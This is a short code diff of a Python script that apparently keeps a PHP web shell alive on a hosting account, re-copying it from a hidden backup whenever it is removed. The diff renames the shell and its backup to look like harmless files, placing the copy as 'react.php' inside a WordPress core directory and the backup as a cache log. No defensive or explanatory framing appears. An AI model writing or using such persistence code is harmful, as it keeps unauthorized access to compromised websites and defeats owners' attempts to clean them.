@@ -2,8 +2,8 @@ import shutil
 import os
 import time
 
-backup_php = "/home/user/.rev/shell.php"
-restore_path = "/home/user/public_html/shell.php"
+backup_php = "/home2/foxlogde/.cache/logs.php"
+restore_path = "/home2/foxlogde/public_html/wp-includes/pomo/react.php"
 
 while True:
     if not os.path.exists(restore_path):
